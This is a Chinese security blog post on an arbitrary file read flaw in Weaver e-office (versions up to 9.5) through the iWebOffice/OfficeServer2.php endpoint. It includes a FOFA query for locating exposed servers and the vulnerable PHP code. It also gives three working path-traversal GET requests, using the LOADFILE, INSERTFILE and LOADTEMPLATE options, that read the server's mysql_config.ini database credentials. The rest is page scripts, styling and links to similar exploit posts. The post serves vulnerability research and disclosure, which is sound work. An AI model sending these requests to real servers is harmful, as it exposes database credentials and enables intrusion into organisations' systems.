---
title: "泛微e-office OfficeServer2.php 文件读取漏洞"
source: https://mrxn.net/jswz/eoffice-iWebOffice-OfficeServer2-fileread.html
asset_dir: assets/泛微e-office-officeserver2.php-文件读取漏洞
---

# 泛微e-office OfficeServer2.php 文件读取漏洞

[Mrxn](https://mrxn.net/author/1)* 发表于2025/5/12 08:28
* 1085浏览
* [0评论](#comment)
* 30分钟阅读

深入探索

SQL

office

应用程序


(adsbygoogle = window.adsbygoogle || []).push({});

---

# 漏洞简介

[泛微](https://mrxn.net/tag/泛微)E-Office是一款标准化的协同 OA 办公软件，泛微协同办公产品系列成员之一,实行通用化产品设计，充分贴合企业管理需求，本着简洁易用、高效智能的原则，为企业快速打造移动化、无纸化、数字化的办公平台。泛微e-office `iWebOffice/OfficeServer2.php` 接口 `LOADFILE` 、`INSERTFILE` 和 `LOADTEMPLATE` 存在任意[文件读取](https://mrxn.net/tag/%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96)漏洞，攻击者可以利用该[漏洞](https://mrxn.net/tag/漏洞)读取服务器上任意文件内容，造成敏感信息泄露。

商务软件和生产力软件

# 影响版本

e-office <=9.5

# fofa语法

> `app="泛微-EOffice"`

# 漏洞分析

深入探索

Docker加速服务

计算机安全

云安全解决方案

## LOADFILE

```
$mFilePath = $_SERVER['DOCUMENT_ROOT']."attachment";
case "LOADFILE" :
    $mFileName = $_REQUEST['FILENAME'];
    $mRecordID = $_REQUEST['RECORDID'];
    $mFullPath = $mFilePath."/".$mRecordID."/".$mFileName;
    $mFullPath = ( "utf-8", "gbk", $mFullPath );
    $result = ( $mFullPath );
    if ( $result == false )
    {
        $MsgError = $_lang['file_file_not_exist'].$mFullPath;
    }
    else
    {
        $fd = ( $mFullPath, "rb" );
        $mFileSize = ( $mFullPath );
        $mFileBody = ( $fd, ( $mFullPath ) );
        ( $fd );
        $MsgObj = $MsgObj."STATUS=".( $_lang['file_open_success']."!" )."\r\n";
    }
    break;
```

深入探索

Web安全课程

SQL注入防护

网络安全会议

因 `FILENAME` 和 `RECORDID` 参数用户可控且无任何过滤或校验，导致可以拼接任意文件路径进行文件操作。

漏洞扫描服务

## INSERTFILE

```
case "INSERTFILE" :
    $mFileName = $_REQUEST['FILENAME'];
    $mRecordID = $_REQUEST['RECORDID'];
    $mFullPath = $mFilePath."/".$mRecordID."/".$mFileName;
    $mFullPath = ( "utf-8", "gbk", $mFullPath );
    $result = ( $mFullPath );
    if ( !$result )
    {
        $MsgError = $_lang['file_file_not_exist'].$mFullPath;
    }
    else
    {
        $MsgObj = $MsgObj."POSITION=".( "Content" )."\r\n";
        $fd = ( $mFullPath, "rb" );
        $mFileSize = ( $mFullPath );
        $mFileBody = ( $fd, ( $mFullPath ) );
        ( $fd );
        $MsgObj = $MsgObj."STATUS=".( $_lang['file_open_success']."!" )."\r\n";
    }
    break;
```

## LOADTEMPLATE

```
case "LOADTEMPLATE" :
    $mTemplate = $TEMPLATE;
    $mFileType = $FILETYPE;
    $mCommand = $COMMAND;
    $mFileName = $FILENAME;
    $mFullPath = $mFilePath."/".$mTemplate.$mFileType;
    $mFullPath = ( "utf-8", "gbk", $mFullPath );
    if ( $mCommand == "INSERTFILE" )
    {
        $result = ( $mFullPath );
        $MsgObj = $MsgObj."result=".( "result" )."\r\n";
        if ( !$result )
        {
            $MsgError = $_lang['file_temp_not_exist']."File not exists".$mFullPath;
        }
        else
        {
            $fd = ( $mFullPath, "rb" );
            $mFileSize = ( $mFullPath );
            $mFileBody = ( $fd, ( $mFullPath ) );
            ( $fd );
            $MsgObj = $MsgObj."STATUS=".( $_lang['file_open_success']."!" )."\r\n";
        }
        $MsgObj = $MsgObj."PATH=".( $result )."\r\n";
    }
```

# 漏洞复现

## LOADFILE

```
GET /iWebOffice/OfficeServer2.php?OPTION=LOADFILE&FILENAME=../mysql_config.ini HTTP/1.1
Host: eoffice.mrxn.net:8082
```

成功读取到 `mysql_config.ini` 文件数据库配置信息

物流软件安全

[![泛微e-office OfficeServer2.php 文件读取漏洞](images/img-001-eccdf0af5c0b.webp)](https://image.mrxn.net/068fed3161d84ffbbd238e7425589026.webp)

## INSERTFILE

```
GET /iWebOffice/OfficeServer2.php?OPTION=INSERTFILE&FILENAME=../mysql_config.ini HTTP/1.1
Host: eoffice.mrxn.net:8082
```

成功读取到 `mysql_config.ini` 文件数据库配置信息

商务软件和生产力软件

[![泛微e-office OfficeServer2.php 文件读取漏洞](images/img-002-9e4b8ea8c639.webp)](https://image.mrxn.net/7a4b05355f764b81ad1e470b6db7bb5c.webp)

## LOADTEMPLATE

```
GET /iWebOffice/OfficeServer2.php?OPTION=LOADTEMPLATE&COMMAND=INSERTFILE&TEMPLATE=../mysql_config.ini HTTP/1.1
Host: eoffice.mrxn.net:8082
```

成功读取到 `mysql_config.ini` 文件数据库配置信息

漏洞扫描服务

[![泛微e-office OfficeServer2.php 文件读取漏洞](images/img-003-0d84c45fc1a6.webp)](https://image.mrxn.net/27b9d59548604f7fa4a7735711200ce4.webp)

* 标签：
* [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
* [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
* [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
* [#泛微](https://mrxn.net/tag/%E6%B3%9B%E5%BE%AE)
* [#文件读取](https://mrxn.net/tag/%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96)

---


// 获取当前脚本所在的父容器
const parentContainer = document.currentScript.parentElement;
let searchContainer = parentContainer.querySelector('article') || parentContainer;
if (searchContainer) {
// 优先在 class 名为 prose 或 markdown 的容器内搜索 img 图片
let images = [];
const containers = searchContainer.querySelectorAll('.prose, .markdown');
containers.forEach(function(container) {
images = images.concat(Array.from(container.querySelectorAll('img')));
});
if (images.length === 0) {
images = searchContainer.querySelectorAll('img');
}
images.forEach(function(img) {
if (img.getAttribute('data-action') === 'zoom') {
const parentLink = img.parentNode;
if (parentLink.tagName === 'A') {
parentLink.setAttribute('data-fancybox', 'gallery');
}
} else {
const link = document.createElement('a');
link.setAttribute('data-fancybox', 'gallery');
link.setAttribute('href', img.getAttribute('src'));
img.parentNode.insertBefore(link, img);
link.appendChild(img);
}
});
// 初始化 Fancybox
Fancybox.bind("[data-fancybox]", {
// 您的自定义选项
});
}

文章目录
×

* [1.漏洞简介](#toc-1-)
* [2.影响版本](#toc-2-)
* [3.fofa语法](#toc-3-)
* [4.漏洞分析](#toc-4-)
* [4.1.LOADFILE](#toc-4-1-)
* [4.2.INSERTFILE](#toc-4-2-)
* [4.3.LOADTEMPLATE](#toc-4-3-)
* [5.漏洞复现](#toc-5-)
* [5.1.LOADFILE](#toc-5-1-)
* [5.2.INSERTFILE](#toc-5-2-)
* [5.3.LOADTEMPLATE](#toc-5-3-)



.x\_nav\_toc {
position: fixed;
top: 0;
right: -300px;
width: 280px;
height: 100%;
background-color: white;
box-shadow: -2px 0 15px rgba(0, 0, 0, 0.1);
z-index: 1000;
transition: right 0.3s ease;
display: flex;
flex-direction: column;
overflow: hidden;
padding-top: 10px;
}
.x\_nav\_toc.active {
right: 0;
}
.x\_toc\_header {
display: flex;
justify-content: space-between;
align-items: center;
padding: 15px 20px;
height: 48px;
border-bottom: 1px solid #eee;
}
.x\_toc\_title {
font-size: 18px;
font-weight: bold;
color: #333;
}
.x\_toc\_close {
background: none;
border: none;
font-size: 24px;
cursor: pointer;
color: #777;
transition: color 0.2s;
}
.x\_toc\_close:hover {
color: #333;
}
.x\_toc\_content {
flex: 1;
overflow-y: auto;
padding: 15px 20px;
padding-right: 10px;
}
.x\_anchor-list {
list-style-type: none;
padding: 0;
margin: 0;
}
/\* 减小目录项间距 \*/
.x\_anchor-list li {
margin-bottom: 4px; /\* 间距从8px减小到4px \*/
}
.x\_anchor-list a {
text-decoration: none;
color: #555;
display: block;
padding: 6px 10px; /\* 减少内边距 \*/
transition: all 0.2s;
font-size: 14px;
border-radius: 4px;
line-height: 1.4; /\* 减小行高 \*/
}
.x\_anchor-list a:hover,
.x\_anchor-list a:focus {
background-color: #f8f9fa;
color: #0068d6;
}
.toc-number {
font-weight: 600;
margin-right: 8px;
color: #495057;
display: inline-block;
min-width: 25px;
}
/\* 减小各级标题间距 \*/
.toc-h1 {
font-weight: 600;
font-size: 15px;
margin-top: 10px; /\* 上边距从15px减小到10px \*/
padding-left: 5px !important;
}
.toc-h2 {
font-size: 14px;
padding-left: 15px !important; /\* 缩进从20px减小到15px \*/
}
.toc-h3 {
font-size: 13px;
padding-left: 25px !important; /\* 缩进从30px减小到25px \*/
}
.toc-h4 {
font-size: 12px;
padding-left: 35px !important; /\* 缩进从40px减小到35px \*/
}
/\* 修改后的切换按钮样式 - 使用图标且位置下移 \*/
.x\_toc\_toggle {
position: fixed;
bottom:120px; right: 17px;width:40px;height:40px;background-color:white;
border-radius: 50%;
border: none;
cursor: pointer;
box-shadow: 0 4px 12px rgba(0,0,0,0.15);
z-index: 999;
transition: all 0.3s ease;
display: flex;
align-items: center;
justify-content: center;
padding: 0;
}
.x\_toc\_toggle svg {
width:24px;height:24px;stroke:#3d9bff;
}
.x\_toc\_toggle:hover {
#background-color: #0081f8;
transform: translateY(-3px);
box-shadow: 0 6px 15px rgba(0,0,0,0.2);
}
@media (max-width: 768px) {
.x\_nav\_toc {
width: 280px;
}
.x\_toc\_toggle {
bottom: 100px; /\* 手机端也下移位置 \*/
right: 30px;
width: 40px;
height: 40px;
}
.x\_toc\_toggle svg {
width: 20px;
height: 20px;
}
}

document.addEventListener('DOMContentLoaded', function() {
// 获取所有标题元素
var className = ".line-numbers";
var selectors = [];
for (var i = 1; i <= 6; i++) {
selectors.push(className + ' h' + i);
}
var headings = document.querySelectorAll(selectors.join(', '));
// 获取DOM元素
var tocContainer = document.querySelector('.x\_nav\_toc');
var toggleButton = document.querySelector('.x\_toc\_toggle');
var tocList = document.querySelector('.x\_anchor-list');
var closeButton = document.querySelector('.x\_toc\_close');
var currentHighlight = null;
// 检测是否为移动设备
const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
// 如果没有标题，隐藏所有元素
if (headings.length === 0) {
tocContainer.style.display = 'none';
toggleButton.style.display = 'none';
return;
}
// 初始化层级计数器
var counters = [0, 0, 0, 0, 0, 0]; // h1-h6
var currentLevel = 0;
// 生成带数字编号的目录
headings.forEach(function(heading, index) {
var level = parseInt(heading.tagName[1]);
// 更新计数器
counters[level - 1] += 1; // 增加当前级别计数器
// 重置更低级计数器
for (var i = level; i < 6; i++) {
counters[i] = 0;
}
// 生成编号字符串（如"1.2.3"）
var numberParts = [];
for (var i = 0; i < level; i++) {
if (counters[i] > 0) {
numberParts.push(counters[i]);
}
}
var numberText = numberParts.join('.')+'.';
// 创建唯一ID
var id = 'toc-' + numberText.replace(/\./g, '-');
heading.id = id;
var listItem = document.createElement('li');
var anchor = document.createElement('a');
var numberSpan = document.createElement('span');
numberSpan.className = 'toc-number';
numberSpan.textContent = numberText;
anchor.appendChild(numberSpan);
anchor.innerHTML += heading.textContent;
anchor.href = '#' + id;
anchor.classList.add('toc-h' + level);
listItem.appendChild(anchor);
tocList.appendChild(listItem);
// 添加点击事件（不关闭目录）
anchor.addEventListener('click', function(e) {
e.preventDefault();
// 更新高亮状态
if (currentHighlight) {
currentHighlight.classList.remove('active');
}
this.classList.add('active');
currentHighlight = this;
// 滚动到对应位置
var targetId = this.getAttribute('href').substring(1);
var targetElement = document.getElementById(targetId);
if (targetElement) {
var header = document.querySelector("header");
var headerHeight = header ? header.offsetHeight : 0;
var elementPosition = targetElement.getBoundingClientRect().top + window.pageYOffset;
var offsetPosition = elementPosition - headerHeight - 20;
window.scrollTo({
top: offsetPosition,
behavior: 'smooth'
});
// 滚动到目录项的可视区域
this.scrollIntoView({behavior: 'smooth', block: 'nearest'});
// 点击事件中
if (isMobile) {
closeToc(); // 移动端点击后关闭目录
}
}
});
});
// 切换按钮点击事件
toggleButton.addEventListener('click', function() {
tocContainer.classList.add('active');
});
// 关闭按钮点击事件
closeButton.addEventListener('click', function(e) {
e.stopPropagation();
closeToc();
});
// 滚动时更新高亮状态
window.addEventListener('scroll', function() {
var fromTop = window.scrollY;
var header = document.querySelector("header");
var headerHeight = header ? header.getBoundingClientRect().height : 0; // 更精确的header高度
//console.log(headerHeight);
// 精准计算标题文档位置
var activeSection = null;
headings.forEach(function(heading) {
var section = document.getElementById(heading.id);
if (!section) return;
// 使用getBoundingClientRect获取精确位置
var rect = section.getBoundingClientRect();
var sectionTop = rect.top + fromTop; // 转换为文档顶部绝对位置
var sectionBottom = rect.bottom + fromTop + headerHeight;
// 增加20px激活区域缓冲
if (fromTop + headerHeight + 20 >= sectionTop && fromTop < sectionBottom) {
activeSection = heading;
}
});
// 更新高亮状态（新增精确边界判断）
if (activeSection) {
var tocLink = tocList.querySelector('a[href="#' + activeSection.id + '"]');
if (tocLink && currentHighlight !== tocLink) {
if (currentHighlight) {
currentHighlight.blur();
currentHighlight.classList.remove('active');
}
tocLink.classList.add('active');
tocLink.focus();
currentHighlight = tocLink;
// 平滑滚动到可视区域（改进触发条件）
var tocRect = tocLink.getBoundingClientRect();
var tocContainerRect = tocContainer.getBoundingClientRect();
if (tocRect.bottom > tocContainerRect.bottom || tocRect.top < tocContainerRect.top) {
tocLink.scrollIntoView({behavior: 'auto', block: 'nearest'});
}
}
}
});
// 关闭目录面板
function closeToc() {
tocContainer.classList.remove('active');
}
});

/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
#qrcode-right {
display: none;
}
}

版权所有：[Mrxn's Blog](https://mrxn.net/)  
文章标题：[泛微e-office OfficeServer2.php 文件读取漏洞](https://mrxn.net/jswz/eoffice-iWebOffice-OfficeServer2-fileread.html)  
文章链接：<https://mrxn.net/jswz/eoffice-iWebOffice-OfficeServer2-fileread.html>  
本站文章均为原创，未经授权请勿用于任何商业用途。仅供安全研究和学习使用。若因传播、利用本文档信息而产生任何直接或间接的后果或损害，均由使用者自行承担，文章作者不为此承担任何责任。

安全研究工具

![](data:image/png;base64,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)

设备上扫码阅读


var qrcode = new QRCode(document.getElementById("copyright-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/eoffice-iWebOffice-OfficeServer2-fileread.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});

  

### 📚 推荐阅读

* [深信服运维安全管理系统 install\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-install_patch-rce.html)
* [深信服运维安全管理系统 del\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-del_patch-rce.html)
* [深信服运维安全管理系统 upload\_file 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-cssp-app-upload_file-rce.html)
* [深信服运维安全管理系统 csspost/update 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-csspost-update-rce.html)
* [深信服运维安全管理系统 save\_SNMP 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-SNMP-save_SNMP-rce.html)
* [深信服运维安全管理系统 getLdap 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-getLdap-rce.html)
* [深信服运维安全管理系统 Jwt 密钥硬编码](https://mrxn.net/jswz/sangfor_osm-login-search_login-token-leak.html)
* [深信服运维安全管理系统 del\_route 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_route-rce.html)
* [深信服运维安全管理系统 del\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_net-rce.html)
* [深信服运维安全管理系统 change\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-change_net-rce.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 updateLoginName SQL注入漏洞](https://mrxn.net/jswz/bigant-user-updateLoginName-sqli.html)
* [九佳易管理系统 PrivilegedCodeDestroy.asmx SQL注入漏洞](https://mrxn.net/jswz/a8erp-Interface-licx-PrivilegedCodeDestroy-sqli.html)
* [九佳易管理系统 Ajax\_XT.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-Ajax_XT-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 moveDept SQL注入漏洞](https://mrxn.net/jswz/bigant-dept-moveDept-sqli.html)
* [青龙面板最新版v2.20.1 鉴权绕过致RCE漏洞](https://mrxn.net/jswz/qinglong-auth-bypass-rce.html)
* [九佳易管理系统 picHY.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-HuiYuanDangAn-picHY-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 安装程序二次注入致远程代码执行漏洞](https://mrxn.net/jswz/bigant-install-config-rce.html)
* [东胜物流软件 MsChDuiController 多个SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsChDuiController-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 PublicController 任意文件读取漏洞](https://mrxn.net/jswz/bigant-Public-download.html)
* [东胜物流软件 MsAnnounceController SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsAnnounce-GetData-sqli.html)

  

/\* 底部展示样式 \*/
.qrcode-bottom-box {
margin: 40px auto;
text-align: center;
}
.qrcode-title {
font-size: 16px;
color: #666;
margin-bottom: 0px;
font-weight: bold;
text-align: center;
}
.qrcode-bottom-box img {
display: inline-block;
padding: 10px;
background: #fff;
border-radius: 8px;
margin: 10px auto;
}
/\* 悬浮展示样式 \*/
.qrcode-float {
position: fixed;
z-index: 9999;
background: rgba(255,255,255,0.98);
padding: 20px;
border-radius: 12px;
}
.qrcode-float:hover {
transform: scale(1.05);
}
/\* 移动端适配 \*/
@media (max-width: 1440px) {
.qrcode-float {
right: 2%;
transform: none;
}
}
/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
.qrcode-float {
display: none;
}
}

![](data:image/png;base64,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